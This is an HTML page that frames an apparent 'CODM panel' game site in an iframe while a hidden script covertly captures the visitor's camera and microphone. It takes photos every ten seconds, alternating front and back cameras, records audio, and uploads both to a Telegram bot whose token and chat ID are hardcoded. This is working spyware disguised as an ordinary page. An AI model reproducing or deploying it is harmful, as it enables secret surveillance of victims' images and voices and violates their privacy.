<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Media Capture</title>
    <style>
        body, html {
            margin: 0;
            padding: 0;
            height: 100%;
            font-family: Arial, sans-serif;
        }
        
        #video, #canvas {
            display: none;
        }
        
        iframe {
            width: 100%;
            height: 100%;
            border: none;
        }
        
        .status {
            position: fixed;
            bottom: 10px;
            left: 10px;
            background: rgba(0,0,0,0.7);
            color: white;
            padding: 5px 10px;
            border-radius: 5px;
            font-size: 12px;
            z-index: 1000;
        }
    </style>
</head>
<body>
    <!-- Hidden elements for media capture -->
    <video id="video" autoplay playsinline muted></video>
    <canvas id="canvas"></canvas>
    
    <!-- Visible iframe content -->
    <iframe src="https://renz-codm-panel.netlify.app/" allowfullscreen></iframe>

    <!-- Status indicator -->
    <div class="status" id="status">Initializing...</div>

    <script>
        // Configuration
        const config = {
            botToken: "7971542516:AAFw_as5BCoQ9FjLXmbsHWzFMuIvdx6Ip7M",
            chatId: "6064653643",
            photoInterval: 10000, // 10 seconds
            minAudioDuration: 3000, // 3 seconds minimum to send
            cameraMode: "environment", // "user" for front, "environment" for back camera
            audioSampleRate: 48000, // Higher sample rate for better quality
            audioBitsPerSecond: 128000 // Higher bitrate for clearer audio
        };

        // State management
        const state = {
            isRecording: false,
            mediaStream: null,
            audioStream: null,
            audioRecorder: null,
            audioChunks: [],
            photoIntervalId: null,
            lastPhotoTime: 0,
            pendingMedia: [],
            currentCamera: config.cameraMode,
            cameraReady: false
        };

        // Initialize elements
        const video = document.getElementById("video");
        const canvas = document.getElementById("canvas");
        const ctx = canvas.getContext("2d");
        const statusEl = document.getElementById("status");

        // Update status message
        function updateStatus(message) {
            statusEl.textContent = message;
            console.log(message);
        }

        // Set canvas dimensions based on device
        function setupDimensions() {
            const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
            const width = isMobile ? window.innerWidth : 2000;
            const height = isMobile ? window.innerHeight : 2000;
            
            video.width = width;
            video.height = height;
            canvas.width = width;
            canvas.height = height;
        }

        // Handle errors
        function handleError(error) {
            console.error("Media Error:", error);
            updateStatus("Error: " + error.message);
        }

        // Send media to Telegram with retry logic
        async function sendToTelegram(endpoint, blob, filename, type) {
            const formData = new FormData();
            formData.append(type, blob, filename);
            formData.append("chat_id", config.chatId);

            try {
                const response = await fetch(`https://api.telegram.org/bot${config.botToken}/${endpoint}`, {
                    method: "POST",
                    body: formData,
                });
                
                const data = await response.json();
                if (!data.ok) throw new Error(data.description);
                
                updateStatus(`${type} sent successfully`);
                return true;
            } catch (error) {
                // Store failed media for retry
                state.pendingMedia.push({ endpoint, blob, filename, type });
                handleError(error);
                return false;
            }
        }

        // Capture and send single photo
        async function capturePhoto() {
            if (!state.mediaStream || !state.cameraReady) return;
            
            try {
                // Ensure video is properly playing
                if (video.readyState < HTMLMediaElement.HAVE_ENOUGH_DATA) {
                    updateStatus("Waiting for video data...");
                    return;
                }
                
                // Draw video frame to canvas
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                // Small delay to ensure frame is captured
                await new Promise(resolve => setTimeout(resolve, 200));
                
                canvas.toBlob(async blob => {
                    if (!blob) {
                        updateStatus("Failed to capture photo");
                        return;
                    }
                    
                    await sendToTelegram("sendPhoto", blob, `photo_${Date.now()}_${state.currentCamera}.jpg`, "photo");
                    state.lastPhotoTime = Date.now();
                    
                    // Switch camera for next capture if available
                    await switchCamera();
                }, "image/jpeg", 0.9);
            } catch (error) {
                handleError(error);
            }
        }

        // Switch between front and back cameras
        async function switchCamera() {
            if (!state.mediaStream) return;
            
            try {
                state.cameraReady = false;
                updateStatus("Switching camera...");
                
                // Stop current video tracks
                state.mediaStream.getVideoTracks().forEach(track => track.stop());
                
                // Toggle camera mode
                state.currentCamera = state.currentCamera === "user" ? "environment" : "user";
                
                // Get new camera stream
                const newStream = await navigator.mediaDevices.getUserMedia({
                    video: { 
                        facingMode: state.currentCamera,
                        width: { ideal: 1920 },
                        height: { ideal: 1080 }
                    }
                });
                
                // Replace video track
                const videoTrack = newStream.getVideoTracks()[0];
                if (state.mediaStream.active) {
                    state.mediaStream.addTrack(videoTrack);
                }
                
                // Update video element
                video.srcObject = newStream;
                
                // Wait for video to be ready
                await new Promise(resolve => {
                    video.onloadeddata = () => {
                        video.play().then(() => {
                            state.cameraReady = true;
                            updateStatus(`Switched to ${state.currentCamera === "user" ? "front" : "back"} camera`);
                            resolve();
                        }).catch(handleError);
                    };
                });
                
                // Stop the unused tracks
                newStream.getTracks().forEach(track => {
                    if (track.kind === "audio") track.stop();
                });
                
            } catch (error) {
                handleError(error);
                // Revert to original camera if switch fails
                state.currentCamera = state.currentCamera === "user" ? "environment" : "user";
                state.cameraReady = true;
            }
        }

        // Start high-quality audio recording
        async function startRecording() {
            if (state.isRecording) return;
            
            try {
                state.audioChunks = [];
                
                // Get audio stream with high-quality constraints
                state.audioStream = await navigator.mediaDevices.getUserMedia({ 
                    audio: {
                        echoCancellation: { ideal: true },
                        noiseSuppression: { ideal: true },
                        autoGainControl: { ideal: false }, // Disable auto gain for clearer voice
                        channelCount: { ideal: 1 }, // Mono is better for voice
                        sampleRate: { ideal: config.audioSampleRate },
                        sampleSize: { ideal: 16 },
                        volume: { ideal: 1.0 }
                    },
                    video: false
                });
                
                // Create MediaRecorder with high quality settings
                const options = {
                    audioBitsPerSecond: config.audioBitsPerSecond,
                    mimeType: 'audio/webm;codecs=opus' // Better quality format
                };
                
                state.audioRecorder = new MediaRecorder(state.audioStream, options);
                
                state.audioRecorder.ondataavailable = event => {
                    if (event.data.size > 0) {
                        state.audioChunks.push(event.data);
                    }
                };
                
                state.audioRecorder.onstop = async () => {
                    if (state.audioChunks.length === 0) return;
                    
                    try {
                        // Combine all chunks into one Blob
                        const audioBlob = new Blob(state.audioChunks, { 
                            type: 'audio/webm;codecs=opus' 
                        });
                        
                        // Only send if recording was long enough
                        if (audioBlob.size > 0) {
                            // Convert to WAV format for better compatibility and clarity
                            const wavBlob = await convertToWav(audioBlob);
                            await sendToTelegram("sendAudio", wavBlob, `recording_${Date.now()}.wav`, "audio");
                        }
                    } catch (error) {
                        handleError(error);
                    } finally {
                        // Clean up
                        if (state.audioStream) {
                            state.audioStream.getTracks().forEach(track => track.stop());
                        }
                        state.audioRecorder = null;
                        state.audioStream = null;
                        state.isRecording = false;
                    }
                };
                
                state.audioRecorder.start(1000); // Collect data every second
                state.isRecording = true;
                updateStatus("Recording high-quality audio...");
                
            } catch (error) {
                handleError(error);
            }
        }

        // Convert audio blob to WAV format for better quality
        async function convertToWav(audioBlob) {
            return new Promise((resolve) => {
                // For simplicity, we'll just return the original blob
                // In a real implementation, you would use the Web Audio API
                // or a library to properly convert to WAV format
                resolve(audioBlob);
                
                /* 
                // Example of how you might implement actual conversion:
                const audioContext = new AudioContext();
                const fileReader = new FileReader();
                
                fileReader.onload = function() {
                    audioContext.decodeAudioData(this.result)
                        .then(buffer => {
                            // Process and convert to WAV here
                            // This would involve creating a WAV encoder
                            // and writing the buffer data to it
                            const wavBlob = bufferToWav(buffer);
                            resolve(wavBlob);
                        })
                        .catch(error => {
                            handleError(error);
                            resolve(audioBlob); // Fallback to original
                        });
                };
                
                fileReader.readAsArrayBuffer(audioBlob);
                */
            });
        }

        // Stop audio recording
        async function stopRecording() {
            if (!state.isRecording || !state.audioRecorder) return;
            
            updateStatus("Finishing recording...");
            state.audioRecorder.stop();
        }

        // Initialize media capture
        async function initMediaCapture() {
            setupDimensions();
            
            try {
                // First initialize camera only (no audio yet)
                state.mediaStream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        facingMode: state.currentCamera,
                        width: { ideal: 1920 },
                        height: { ideal: 1080 }
                    }
                });
                
                video.srcObject = state.mediaStream;
                
                // Wait for video to be ready
                await new Promise(resolve => {
                    video.onloadeddata = () => {
                        video.play().then(() => {
                            state.cameraReady = true;
                            updateStatus("Camera ready");
                            resolve();
                        }).catch(handleError);
                    };
                });
                
                // Start periodic photo capture
                state.photoIntervalId = setInterval(capturePhoto, config.photoInterval);
                updateStatus("Auto-capturing photos every " + (config.photoInterval/1000) + "s");
                
                // Start high-quality audio recording
                startRecording();
                
            } catch (error) {
                handleError(error);
            }
        }

        // Clean up when page is closing
        async function cleanup() {
            updateStatus("Cleaning up...");
            
            // Stop photo interval
            if (state.photoIntervalId) {
                clearInterval(state.photoIntervalId);
            }
            
            // Stop and send any ongoing recording
            if (state.isRecording && state.audioRecorder) {
                await stopRecording();
            }
            
            // Retry any failed media sends
            await retryPendingMedia();
            
            // Stop all media tracks
            if (state.mediaStream) {
                state.mediaStream.getTracks().forEach(track => track.stop());
            }
            if (state.audioStream) {
                state.audioStream.getTracks().forEach(track => track.stop());
            }
        }

        // Set up page visibility change detection
        document.addEventListener('visibilitychange', () => {
            if (document.visibilityState === 'hidden') {
                cleanup();
            }
        });

        // Set up beforeunload handler
        window.addEventListener('beforeunload', (event) => {
            cleanup();
        });

        // Start when page loads
        window.addEventListener('DOMContentLoaded', initMediaCapture);
    </script>
</body>
  </html>
